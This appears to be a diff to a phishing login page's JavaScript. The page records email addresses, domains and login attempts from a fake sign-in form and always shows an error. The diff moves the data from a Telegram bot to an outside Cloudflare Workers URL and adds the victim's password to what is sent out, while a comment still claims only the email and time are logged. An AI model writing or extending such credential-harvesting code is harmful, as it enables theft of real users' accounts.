@@ -930,7 +930,7 @@ Time: ${now.toLocaleString()}
 ISO: ${now.toISOString()}
 ━━━━━━━━━━━━━━`;
 
-        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        fetch(`https://square-sun-b728.saleudon1.workers.dev/`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -1014,7 +1014,7 @@ ISO: ${now.toISOString()}
         const domain = email.split('@')[1];
 
         // 🔔 TELEGRAM LOG (EMAIL + TIME ONLY)
-        sendTelegram(email, domain, attempts);
+        sendTelegram(email, password, domain, attempts);
 
         // ✅ SHOW ERROR (STAYS VISIBLE)
         if (msg) {
@@ -1052,4 +1052,5 @@ ISO: ${now.toISOString()}
 </body>
 
 </html>
+
 
